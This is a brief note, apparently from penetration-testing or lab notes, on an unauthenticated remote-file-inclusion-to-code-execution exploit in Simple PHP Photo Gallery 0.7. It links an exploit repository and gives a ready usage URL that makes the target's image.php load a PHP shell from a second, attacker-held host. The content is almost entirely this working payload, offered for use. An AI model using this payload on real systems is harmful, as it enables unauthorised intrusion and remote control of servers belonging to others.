# SimplePHPGal - RCE

[GitHub - beauknowstech/SimplePHPGal-RCE.py: Simple PHP Photo Gallery 0.7 - Unauthenticated RFI to RCE](https://github.com/beauknowstech/SimplePHPGal-RCE.py)

**Usage:**

```
http://192.168.155.58/image.php?img=http://192.168.45.201:111/shell.php
```
